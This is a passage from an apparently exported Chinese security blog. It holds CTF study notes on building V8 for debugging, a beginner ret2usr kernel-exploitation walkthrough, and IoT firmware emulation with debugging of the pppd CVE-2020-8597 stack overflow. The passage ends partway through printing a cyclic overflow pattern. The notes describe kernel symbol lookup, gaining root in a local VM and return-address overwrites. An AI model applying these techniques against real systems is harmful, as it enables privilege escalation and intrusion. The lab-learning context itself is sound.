-<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="depot-tools"><a href="#depot-tools" class="headerlink" title="depot_tools"></a>depot_tools</h5><p>这个工具是用来得到v8源码的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
-
-<h5 id="ninja"><a href="#ninja" class="headerlink" title="ninja"></a>ninja</h5><p>这个工具是用来编译v8的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;github.com&#x2F;ninja-build&#x2F;ninja.git</span><br><span class="line">cd ninja &amp;&amp; .&#x2F;configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
-
-<p>echo两句命令，主要是写入环境变量，后期fetch v8的时候，可能会说找不到fetch命令，可能就是环境变量没了，可以通过vim ~/.bashrc，查看最后面是否有下面这两句话，没有的话，加上</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;</span><br><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;</span><br><span class="line">bash									&#x2F;&#x2F;载入环境变量</span><br></pre></td></tr></table></figure>
-
-<p>然后就是编译启动，我卡死在了v8，真的很慢，而且最后报错，，，出错，网上看了好多，也没解决，，，TAT</p>
-<p>后面的步骤</p>
-<h4 id="v8编译"><a href="#v8编译" class="headerlink" title="v8编译"></a>v8编译</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; cd v8&amp;&amp; gclient sync</span><br><span class="line">$ tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">$ ninja -C out.gn&#x2F;x64.debug</span><br></pre></td></tr></table></figure>
-
-<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;d8</span><br><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;shell</span><br></pre></td></tr></table></figure>
-
-<p>初始尝试失败，，搞了好久都没出来，，，，但是网上大部分都是这种方法</p>
-<hr>
-<h2 id="二次尝试"><a href="#二次尝试" class="headerlink" title="二次尝试"></a>二次尝试</h2><h3 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h3><p><a href="https://eternalsakura13.com/2018/06/26/v8_environment/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/06/26/v8_environment/</a></p>
-<h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><blockquote>
-<p>sakura为我们提供了第二种方法，我一开始试了下，但是谷歌云搞不来，没有信用卡啥的。但是后来只能尝试这个，所以找了下其他国外的云服务器。</p>
-<p>不需要代理啥的，真是舒服。</p>
-<p>知乎上的这篇给了较好的帮助：<a href="https://zhuanlan.zhihu.com/p/130402190" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/130402190</a></p>
-</blockquote>
-<p>我使用的是狗云，进来，“创建景点云服务器”，我一开始用的10G的硬盘，编译的时候发现太小了，然后只好销毁重来一个（这个只要三个工作日内，支持销毁退款）</p>
-<p>操作系统选择这个：CentOS 7 BBR，ubuntu 18我也用了，但还是出问题了</p>
-<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201010130803778.png" alt="image-20201010130803778"></p>
-<p>然后进入“我的经典云服务器”，启动，用xshell远程连过去</p>
-<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201010131058668.png" alt="image-20201010131058668"></p>
-<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="fetch源码"><a href="#fetch源码" class="headerlink" title="fetch源码"></a>fetch源码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum groupinstall &quot;Development Tools&quot;  </span><br><span class="line">sudo yum install -y git gdb bzip2 wget</span><br><span class="line">cd ~</span><br><span class="line">git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">export PATH&#x3D;&#96;pwd&#96;&#x2F;depot_tools:&quot;$PATH&quot;</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">cd ~&#x2F;v8&#x2F;v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598(2019-starctf这道入门题)</span><br><span class="line">gclient sync</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.release(这个真的很慢，要耐心)</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.release # Release version</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.debug # Debug version</span><br></pre></td></tr></table></figure>
-
-<h5 id="release版本和debug版本"><a href="#release版本和debug版本" class="headerlink" title="release版本和debug版本"></a>release版本和debug版本</h5><p>上面的12-15行中，12-13两行下载的是release版本，14-15行下载的是debug版本。release版本可以正常运行，但是有些调试信息不能用，如job命令，执行起来的时候，也会告诉我们，没有调试的符号。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg: loaded 186 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print&#x2F;break)</span><br><span class="line">Reading symbols from .&#x2F;d8...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>
-
-<p>debug就是调试版本，可以输入更多的调试信息。虽然debug看着好，但是，，，后面有点问题，，，两个都下过来就好。</p>
-<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201015161210557.png" alt="image-20201015161210557"></p>
-<p>下过来之后，是这样的。</p>
-<p>我们进入x64.debug就可以调试状态下运行d8。。同理release</p>
-<h4 id="搭建ftp服务器"><a href="#搭建ftp服务器" class="headerlink" title="搭建ftp服务器"></a>搭建ftp服务器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">tar -czvf v8.tar v8</span><br><span class="line">sudo yum install vsftpd -y</span><br><span class="line">systemctl start vsftpd.service(在CentOS7和它之前，启动vsftpd服务的指令是 service vsftpd start，之后要使用新指令)</span><br><span class="line">sudo netstat -nltp | grep 21</span><br><span class="line">cp v8.tar &#x2F;var&#x2F;ftp&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>然后，浏览器就可以访问到了，点击下载即可。</p>
-<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201011095616016.png" alt="image-20201011095616016"></p>
-<p>哇哇哇哇，感天动地，终于搞定了。</p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>实例程序(test.js)：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="v8的gdb"><a href="#v8的gdb" class="headerlink" title="v8的gdb"></a>v8的gdb</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;tools</span><br><span class="line">mv gdbinit gdbinit_v8</span><br><span class="line">cp gdbinit_v8 ~&#x2F;.gdbinit_v8</span><br><span class="line">cd ~ </span><br><span class="line">vim .gdbinit</span><br><span class="line">#加入下面内容</span><br><span class="line">source ~&#x2F;.gdbinit_v8</span><br><span class="line">source ~&#x2F;v8&#x2F;v8&#x2F;tools&#x2F;gdb-v8-support.py</span><br></pre></td></tr></table></figure>
-
-<p>命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;</span><br><span class="line">将test.js放到该目录下</span><br><span class="line">gdb .&#x2F;d8</span><br><span class="line">gdb-peda$ set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">gdb-peda$ r</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;winter&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x3847d864df19(这个地址根据第九行那里显示地址)</span><br><span class="line">0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<p>v8的gdb也可以了</p>
-<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tools&#x2F;dev&#x2F;gm.py x64.debug d8</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>v8</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ret2usr</title>
-    <url>/2020/10/22/ret2usr/</url>
-    <content><![CDATA[<p>适合人群：内核基础为0</p>
-<h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><p>基础知识：</p>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a></p>
-<p><a href="https://xz.aliyun.com/t/7625#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7625#toc-10</a></p>
-<h4 id="copy-from-user"><a href="#copy-from-user" class="headerlink" title="copy_from_user"></a>copy_from_user</h4><p>copy_from_user(void *to, const void __user *from, unsigned long n)</p>
-<p>（1）to：将数据拷贝到<strong>内核地址</strong> </p>
-<p>（2）from：需要拷贝数据的<strong>用户地址</strong></p>
-<p>（3）n：拷贝数据的长度（字节）</p>
-<blockquote>
-<p>也就是将form用户地址中的数据拷贝到to内核地址中去，拷贝长度是n</p>
-</blockquote>
-<h4 id="cpio解压和打包"><a href="#cpio解压和打包" class="headerlink" title="cpio解压和打包"></a>cpio解压和打包</h4><p>解压：cpio -idvm &lt; ../initramfs.cpio<br>打包：find . | cpio -H newc -o &gt; ../initramfs.cpio</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>调试，<code>startvm.sh</code>末尾加上</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-gdb tcp::1234 -S</span><br></pre></td></tr></table></figure>
-
-<p>【注：上一行后面还要加上’ \ ‘，不然的话，远程调试可能端口没开，连不上】</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903111140398.png" alt="image-20200903111140398"></p>
-<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h4 id="ret2usr（level1）"><a href="#ret2usr（level1）" class="headerlink" title="ret2usr（level1）"></a>ret2usr（level1）</h4><p>说明：参考<code>Linux Kernel Pwn 初探</code>,主要加上具体的一些细节</p>
-<h5 id="查找prepare-kernel-cred和commit-creds的地址"><a href="#查找prepare-kernel-cred和commit-creds的地址" class="headerlink" title="查找prepare_kernel_cred和commit_creds的地址"></a>查找prepare_kernel_cred和commit_creds的地址</h5><pre><code>$ grep prepare_kernel_cred  /proc/kallsyms 
-$ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2usr/image-20200903105056015.png" alt="image-20200903105056015"></p>
-<p>但是直接执行，地址都是0x0，需要root权限。</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903105223481.png" alt="image-20200903105223481"></p>
-<p>方法：修改suid</p>
-<p>（1）创建一个文件夹</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir myimage</span><br><span class="line">$ cd myimage</span><br></pre></td></tr></table></figure>
-
-<p>（2）解压initramfs.cpio文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cpio -idvm &lt; ..&#x2F;initramfs.cpio</span><br></pre></td></tr></table></figure>
-
-<p>（3）修改suid</p>
-<p>进入etc/init.d/rcS，将1000修改为0</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ gedit etc&#x2F;init.d&#x2F;rcS</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/ret2usr/image-20200903110009863.png" alt="image-20200903110009863"></p>
-<p>（4）重新打包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ find . | cpio -H newc -o &gt; ..&#x2F;initramfs.cpio</span><br><span class="line">level1&#x2F;myimage$ cd ..</span><br></pre></td></tr></table></figure>
-
-<p>（5）再次执行两条命令即可</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903110203208.png" alt="image-20200903110203208"></p>
-<p>已经是root权限了</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903110251793.png" alt="image-20200903110251793"></p>
-<p><code>prepare_kernel_cred</code>的地址为<code>0xffffffff810b9d80</code></p>
-<p><code>commit_creds</code>的地址为<code>0xffffffff810b99d0</code></p>
-<blockquote>
-<p>疑问解答：此时已经获得root权限了，不就可以直接cat /flag了？</p>
-<p>实际题目中，不会把真的flag放文件里给你，而是在远程环境了。但是本地的地址和远程的地址是一样的，所以，可以通过这种方法得到本地的用户权限，找到prepare_kernel_cred和commit_creds的地址，但是没有办法直接获得flag。</p>
-</blockquote>
-<h5 id="查找基地址"><a href="#查找基地址" class="headerlink" title="查找基地址"></a>查找基地址</h5><p>以root权限运行，参考上面（修改etc/init.d/rcS）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;pwn # cat &#x2F;proc&#x2F;modules </span><br><span class="line">baby 16384 0 - Live 0xffffffffc0002000 (POE)</span><br></pre></td></tr></table></figure>
-
-<h5 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h5><p>（1）编辑startvm.sh，端口可以修改</p>
-<p>0x7ffd958d7e08</p>
-<p><img src="/2020/10/22/ret2usr/image-20200905004851358.png" alt="image-20200905004851358"></p>
-<p>（2）执行<code>./startvm.sh</code></p>
-<p>（3）打开新窗口，在<code>level1</code>目录下执行<code>gdb exp</code></p>
-<p>（4）远程连接，<code>target remote :1234</code></p>
-<p>（5）下断点（ida里面的地址+基地址），继续执行</p>
-<p><img src="/2020/10/22/ret2usr/image-20200905103517562.png" alt="image-20200905103517562"></p>
-<p><img src="/2020/10/22/ret2usr/image-20200905103116021.png" alt="image-20200905103116021"></p>
-<p>（6）在原来的窗口，执行exp</p>
-<p><img src="/2020/10/22/ret2usr/image-20200905103146690.png" alt="image-20200905103146690"></p>
-<p>（7）接着，就可以正常调试了</p>
-<h5 id="执行exp步骤"><a href="#执行exp步骤" class="headerlink" title="执行exp步骤"></a>执行exp步骤</h5><p>（1）编译exp.c</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc exp.c -o exp -w -static -fPIC</span><br></pre></td></tr></table></figure>
-
-<p>（2）将initramfs.cpio解压到myimage文件夹</p>
-<p>（3）将exp移入myimage文件夹下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp exp myimage&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>（4）重新打包，执行./startvm.sh</p>
-<p>exp已在/目录下了</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903111831663.png" alt="image-20200903111831663"></p>
-<h5 id="疑惑的0x88和0x80"><a href="#疑惑的0x88和0x80" class="headerlink" title="疑惑的0x88和0x80"></a>疑惑的0x88和0x80</h5><p>一开始，说将<code>0x100</code>的用户数据拷贝到内核栈上，高度只有<code>0x88</code>，后面又说实际上缓冲区距离<code>rbp</code>是<code>0x80</code>，有点迷。</p>
-<p>一开始的0x88，指的是初始化的时候。</p>
-<p>但是程序初始化的时候，有个压栈操作，所以少减了一个8</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903112746033.png" alt="image-20200903112746033"></p>
-<h5 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h5><p>init_module是内核加载模块的时候调用的</p>
-<p>开始的时候（内核加载模块）：调用init_module</p>
-<p>中间的时候：</p>
-<p>我们调用ioctl调用了sub_0函数</p>
-<p>ioctl的参数就是sub_0的参数</p>
-<p><img src="/2020/10/22/ret2usr/image-20200905120014834.png" alt="image-20200905120014834"></p>
-<p><code>return (signed int)copy_from_user(&amp;v4, v2, 256LL);</code></p>
-<p>我们通过buf覆盖栈上的返回地址，执行v2中copy过去的templine函数，获得shell</p>
-<p>结束的时候：cleanup_module</p>
-]]></content>
-      <tags>
-        <tag>kernel pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>winter</title>
-    <url>/2020/07/23/winter/</url>
-    <content><![CDATA[<p>who am i</p>
-<p>hexo主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>固件iot基础</title>
-    <url>/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p>IOT 安全实战资料收集整合：<a href="https://zybuluo.com/H4l0/note/1524758" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1524758</a></p>
-<h3 id="一、固件安全概述"><a href="#一、固件安全概述" class="headerlink" title="一、固件安全概述"></a>一、固件安全概述</h3><p>​    固件指设备内部保存的<strong>设备 “驱动程序”</strong>，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。</p>
-<p>​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设备的功能及性能。</p>
-<h4 id="固件结构特点"><a href="#固件结构特点" class="headerlink" title="固件结构特点"></a>固件结构特点</h4><p>iot 设备固件一般由 bootloader、kernel、rootfs 几部分组成。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829170912807.png" alt="image-20200829170912807"></p>
-<h3 id="二、固件模拟概述"><a href="#二、固件模拟概述" class="headerlink" title="二、固件模拟概述"></a>二、固件模拟概述</h3><p>iot 设备固件属于嵌入式固件的一种，无法直接运行在 x86 架构上。<br>需要借助一些模拟器来进行模拟，一般选择 qemu 模拟器。</p>
-<h4 id="vmware-和-qemu-的区别"><a href="#vmware-和-qemu-的区别" class="headerlink" title="vmware 和 qemu 的区别"></a>vmware 和 qemu 的区别</h4><p>vmware 和 qemu都是虚拟机软件，他们的区别如下：</p>
-<ul>
-<li>vmware 目前只能模拟 x86 和 x64 架构，也就是是或不能模拟其他指令集，所以通常用来运行 ubuntu 系统，安装开发环境来进行交叉编译开发ARM软件。</li>
-<li>qemu 则能够在PC系统中模拟其他指令集的处理器，比如直接模拟Arm架构的处理器，当然也可以模拟 x86 和 x64 架构。</li>
-</ul>
-<p>使用：</p>
-<ul>
-<li>通常在PC平台安装 vmware 虚拟机软件，运行 ubuntu，编写和编译arm架构软件，然后在目标开发板运行。</li>
-<li>qemu 可以认为是在没有Arm开发板的情况下来模拟一个Arm开发板，运行 ubuntu 中开发的软件进行验证。</li>
-</ul>
-<h4 id="qemu-固件模拟"><a href="#qemu-固件模拟" class="headerlink" title="qemu 固件模拟"></a>qemu 固件模拟</h4><p>有两种运行方式：</p>
-<ul>
-<li>用户模式（user mode）：qemu 可以在当前CPU上执行被编译为支持其他CPU的程序（例如：qemu 可以在 x86 机器上执行一个ARM二进制可执行程序）。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~$ qemu-arm -L .&#x2F; .&#x2F;.&#x2F;usr&#x2F;bin&#x2F;tddp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174231769.png" alt="image-20200829174231769"></p>
-<ul>
-<li>系统模式（system mode）：qemu 能模拟整个电脑系统，包括中央处理器及其他周边设备。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;squashfs-root# chroot . sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174236510.png" alt="image-20200829174236510"></p>
-<h3 id="三、MISP-PWN-amp-ARM-PWN"><a href="#三、MISP-PWN-amp-ARM-PWN" class="headerlink" title="三、MISP PWN &amp; ARM PWN"></a>三、MISP PWN &amp; ARM PWN</h3><h4 id="1）ctf-中的-mips-pwn"><a href="#1）ctf-中的-mips-pwn" class="headerlink" title="1）ctf 中的 mips pwn"></a>1）ctf 中的 mips pwn</h4><h5 id="（a）2020-De1ctf-pppd-（CVE-2020-8597）"><a href="#（a）2020-De1ctf-pppd-（CVE-2020-8597）" class="headerlink" title="（a）2020 De1ctf - pppd （CVE-2020-8597）"></a>（a）2020 De1ctf - pppd （CVE-2020-8597）</h5><p>考点：</p>
-<ol>
-<li>nday cve 漏洞分析和利用；</li>
-<li>mips 指令集栈溢出漏洞的调试和利用</li>
-</ol>
-<p>文件：<code>vmlinux</code>、<code>rootfs.img</code>、<code>qemu</code>的启动脚本<code>start.sh</code>。</p>
-<p>漏洞点：</p>
-<p>在 <a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0" target="_blank" rel="noopener">eap_request</a>和<a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719" target="_blank" rel="noopener">eap_response</a>函数中，<code>rhostname</code>是在栈中分配的256字节长的缓冲区。在<code>EAPT_MD5CHAP</code>分支中，由于<a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426" target="_blank" rel="noopener">不正确的大小检查</a>，主机名大于256个字节长将被允许被复制到<code>rhostname</code>，从而导致堆栈溢出。</p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121124694.png" alt="image-20200830121124694"></p>
-<p>操作步骤：</p>
-<p>（1）用<code>cpio</code>解包<code>rootfs.img</code> 。</p>
-<p>在chall目录下创建rootfs文件夹：<code>mkdir rootfs</code></p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121439048.png" alt="image-20200830121439048"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ cpio -idvm &lt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
-
-<p>（2）编辑<code>etc/inittab</code></p>
-<p>找到对应相同的注释，把下面的覆盖过去即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Put a getty on the serial port</span><br><span class="line">#ttyS0::respawn:&#x2F;sbin&#x2F;getty -L  ttyS0 0 vt100 # GENERIC_SERIAL</span><br><span class="line">#ttyS0::sysinit:&#x2F;pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"># Bring up network device</span><br><span class="line">::sysinit:&#x2F;sbin&#x2F;ifup -a</span><br><span class="line"># Launch gdbserver</span><br><span class="line">ttyS0::sysinit:&#x2F;gdbserver :1234 &#x2F;pppd &#x2F;dev&#x2F;ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"></span><br><span class="line"># Stuff to do for the 3-finger salute</span><br></pre></td></tr></table></figure>
-
-<p>（3）修改<code>start.sh</code>文件</p>
-<p>将最后面<code>-net null...</code>选项修改为<code>-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty</code></p>
-<p>（4）将gdbserver放到环境的根目录<code>rootfs/</code>下</p>
-<p>（5）重新打包<code>rootfs.img</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -o &gt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
-
-<p>（6）运行</p>
-<p><code>./start.sh</code></p>
-<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830122145171.png" alt="image-20200830122145171"></p>
-<p>打开一个新的窗口，使用<code>gdb</code>启动并连接远程<code>pppd</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;hws_zongjie&#x2F;pppd&#x2F;attachment&#x2F;docker&#x2F;chall$ gdb-multiarch -ex &#39;set architecture mips&#39;   \</span><br><span class="line">               -ex &#39;target remote :1234&#39;     \</span><br><span class="line">               -ex &#39;file rootfs&#x2F;pppd&#39;        \</span><br><span class="line">               -ex &#39;break *0x42F9A8&#39;         \</span><br><span class="line">               -ex &#39;continue&#39;</span><br></pre></td></tr></table></figure>
-
-<p>再打开一个新的窗口</p>
-<p>编写一个1024字节长的循环字符串<code>/tmp/sc</code>作为payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python -c &#39;from pwn import*; open(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;wb&quot;).write(cyclic(1024))&#39;</span><br><span class="line">$ cat &#x2F;tmp&#x2F;sc</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakc